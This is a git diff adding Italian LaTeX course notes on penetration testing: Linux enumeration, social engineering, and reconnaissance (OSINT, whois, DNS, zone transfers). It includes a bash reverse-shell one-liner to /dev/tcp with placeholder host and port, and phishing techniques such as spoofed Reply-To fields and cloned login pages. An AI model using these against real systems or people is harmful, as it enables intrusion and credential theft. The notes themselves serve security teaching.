@@ -77,4 +77,62 @@ Cosa accade "dietro le quinte" quando provo ad accedere ad una qualche applicazi
 \paragraph{Processes} la lista dei processi è visibile a tutti gli utenti\footnote{anche i non privilegiati}, con \textsf{ps} otteniamo una tabella in cui abbiamo diverse informazioni utili
 \paragraph{Cron} ogni Sistema Operativo è dotato di un job scheduler gestito dall'utente, i comandi o processi di cron vengono schedulati dal sistema in base a determinate impostazioni, definite in file appositi, il file principale è \textsf{/etc/crontab}: è editabile solo da root, ma leggibile da tutti gli utenti del sistema. È utile in quanto spesso, in caso di pentesting o CTF, potremmo ritrovarci nel caso in cui gli admin hanno messo degli specifici comandi nel crontab, in modo da poterli sfruttare.
 \paragraph{SSH} usando coppia di pub/pr key (RSA) può essere possibile sfruttare delle mal configurazioni per poter ottenere la chiave privata, nel caso in cui non sia stata salvata correttamente. SSH è un tool molto versatile, che permettono oltre che amministrare un server, usare la macchina target per fare molte altre cose.
+\paragraph{Reverse shell}se prendiamo una reverse shell, potrebbe non funzionare con \textsf{/bin/bash -i$>$\&/dev/tcp/ip/port 0$>$\&1}, è possibile mettere \textsf{/bin/bash} in un altro: \textsf{/bin/bash -c "/bin/bash -i $>$\&/dev/tcp/ip/port 0$>$\&1"}
+\section{Social engineering}
+Tattica molto utilizzata in ambito reale, è la metodologia che offre il rate più alto di successo in un pentest. In generale, è l'arte di manipolare le persone per fargli fare azioni che rivelano o divulgano informazioni. Un esempio, che non riguarda l'hacking, era quello di andare al Mc drive per ottenere ordini senza pagare.\\ Esempi reali: campagna di phishing, iniziata dal governo Nord koreano. L'attacco era incentrato sul creare account fake su social network, in cui venivano pubblicati articoli sulla sicurezza informatica, semplicemente collegandosi al sito dei fake researchers riuscivano ad ottenere una shell sul PC delle vittime (sfruttato uno 0 day di Google Chrome). Un altro modo era quello di condividere un progetto di Visual Studio: erano inclusi gli script di compilazione ed esecuzione, in cui c'erano delle reverse shell. La tecnica è molto attuale e raccoglie e cattura molte persone, anche ricercatori di sicurezza informatica.\\ È necessaria l'autorizzazione per effettuare questo tipo di attività, le tattiche si dividono in due insieme:
+\begin{itemize}
+\item remote: non c'è contatto fisico con la vittima, ad esempio una chiamata, una e-mail di phishing
+\item fisiche: contatto diretto con la vittima
+\end{itemize}
+Esempi: sito fake, mail fake che è possibile collegare ad un sito web fake. Una delle tattiche più usate è la patch: si dice che il SO non è aggiornato/non sicuro e si chiede di scaricare la patch (che ovviamente è un virus).\\ Nella mail è sia possibile usare la tecnica della patch, sia quella del sito fake o anche l'inclusione di un allegato malevolo. Un altra  consiste nel comprare un dominio, creare un sotto-dominio noto (poste.it) per fregare quelli poco attenti. Come scoprire una fake mail: nei primi mail server da cui passa l'email, il server deve avere lo stesso dominio del mittente, altrimenti l'invio non è autenticato. Per far si che una fake mail riceva risposta ad un indirizzo diverso dal mittente (che sarà un indirizzo vero) è possibile configurare il campo \textit{reply To}: si inserisce la mail su cui si vuole la risposta\footnote{passando sul nome, si vede che l'indirizzo non è quello originale} (ad un occhio poco attento, non fa differenza)\\ Prima delle rubber ducky, si usavano chiavette usb con dentro file malevoli (in estensioni note come word o excel), da un nome "appetibile".
+\paragraph{SET: Social Engineering Toolkit}presente su kali, facilita attacchi di social engineering, permette di fare clone della pagina di login di un sito web in modo che le credenziali vengano spedite su un server web di nostra scelta.\\ Nel social engineering fisico, si cerca di ottenere accesso fisico: molto pericoloso, è possibile trovare prese/dispositivi sbloccati etc... Vengono usate diverse tattiche:
+\begin{itemize}
+\item nuovo dipendente
+\item dipendente di un'azienda di cui il target è il cliente
+\end{itemize}
+diversi tool per poter clonare badge (che spesso funzionano con NFC) etc...
+\section{Reconnaisance}
+La prima fase di un pentest è al raccolta di informazioni, fase che è fra le più lunghe: non ci si può sbagliare, una volta trovato il punto di accesso o lo buchi on non lo buchi.\\ Abbiamo un target, dove il target può essere una o più macchine, un'applicazione web o un'azienda vera e propria. Occorre raccogliere la maggior parte delle informazioni, ci sono due categorie di raccolta di informazioni:
+\begin{itemize}
+\item attiva
+\item passiva
+\end{itemize}
+\subsection{Raccolta passiva}
+Non c'è mai contatto diretto con la vittima, anche ad esempio visitare il sito web (c'è scambio di pacchetti, quindi è un contatto). Si intende quindi la ricerca via browser web etc..., quindi la ricerca di informazioni che sono di pubblico dominio, anche detto OSINT. Anche solo tramite l'OSINT si riescono a trovare una grande quantità di informazioni.
+\subsubsection{Google Dorking}
+Meccanismo di funzionamento con cui è possibile fare delle query molto precise, senza violare nulla. È possibile restringere la ricerca solo nell'URL o nel testo, anche unire più filtri, il funzionamento è \textsf{nome\_filtro:valore}.
+\subsubsection{Online platforms}
+Altri motori di ricerca che permettono di fare ricerche più mirate,come Wayback machine, che permettono di ritrovare versioni vecchie del sito, che da informazioni che sono state poi cancellate. Un altro sito interessante è pastebin, usato per sharare velocemente file di testo, spesso le persone lo usano pensando che sia privato.\\ C'è poi Shodan, che è un motore di ricerca per dispositivi connessi ad Internet, che permette di cercare \textbf{qualsiasi dispositivo connesso ad Internet}, ci sono dispositivi divisi per marca, ma anche per cui c'è il match con una nuova vulnerabilità.\\ Anche sui social network è possibile trovare svariate informazioni, in base ai filtri usati.
+\subsubsection{Whois}
+Tool a cui passiamo un dominio, che restituisce molte informazioni utili fra cui:
+\begin{itemize}
+\item proprietario di dominio
+\item amministratore 
+\item contatto tecnico
+\item nameservers: l'informazione più utile, in quanto possiamo sfruttare il DNS per raccogliere ulteriori informazioni sul target. Vengono restituiti i server DNS responsabili per il dominio
+\end{itemize}
+spesso, se riusciamo ad ottenere il nome della persona, sappiamo l'username della persona stessa.\\
+\subsubsection{Recon NG}
+Framework per fare raccolta informazioni sul web, è diviso in moduli. È possibile usarlo per interagire con API di Google, Facebook etc...
+\subsection{Raccolta attiva}
+Map dell'infrastruttura di rete target, cercando servizi, vulnerabilità, informazioni che dovrebbero essere riservate etc... effettuando un contatto diretto col target. È questa la fase in cui si raccolgono davvero informazioni importanti.
+\subsubsection{DNS}
+L'informazione più importante che restituisce il \textsf{whois} sono i nameservers, possiamo usare DNS per cercare altre informazioni. 
+Si parte dal root, seguono i TLD, poi i server di secondo livello e poi le foglie. L'organizzazione ad albero non permette di avere duplicati, l'albero viene diviso in zone: ad esempio, tutti i sotto-dominii di uniroma2 sono la zona di uniroma2, le zone possono essere gestite da un particolare server DNS.\\ Nel DNS, oltre a client e server c'è anche il resolver, che accetta le richieste dai client e le manda ai server. È il componente che fa si che le zone vengano gestite correttamente, permette inoltre di fare 2 tipi di richieste:
+\begin{itemize}
+\item ricorsive: il server risponde sempre
+\item iterative: il server risponde con quale server va contattato per conoscere la risposta
+\end{itemize}
+Il DNS gestisce vari record, tra cui i più interessanti sono 
+\begin{itemize}
+\item i record NS, che forniscono i nameserver per un dominio
+\item MX, che contiene i nomi dei server mail
+\item CNAME, occorre per gli alias
+\item TXT, contiene informazioni human readable
+\end{itemize}
+Per interagire con il DNS è possibile usare il comando \textsf{dig}. Per poter enumerare gli host all'interno di un dominio occorre fare forward lookup bruteforce, il contrario è reverse lookup bruteforce, con cui conoscendo un IP di partenza, è possibile (tramite i record PTR se configurati) trovare alcuni domain name mancanti.\\ C'è un tipo di attacco, che si chiama zone transfer: siccome il DNS è distribuito e quindi ci sono dei server responsabili per una zona, è possibile trasferire i dati per una zona. Con questo procedimento, il NS master invia una copia al NS slave, nell'attacco fingiamo di essere un server slave e chiediamo una copia della zona, se il server è configurato male la otteniamo. Se riusciamo, l'informazione che otteniamo è la lista di tutti gli host della zona. Si può fare con il comando \textsf{dig}:
+\begin{itemize}
+\item trovare il nameserver
+\item effettuare \textsf{dig axsf} per far trasferire la copia della zona.
+\end{itemize}
 \end{document}
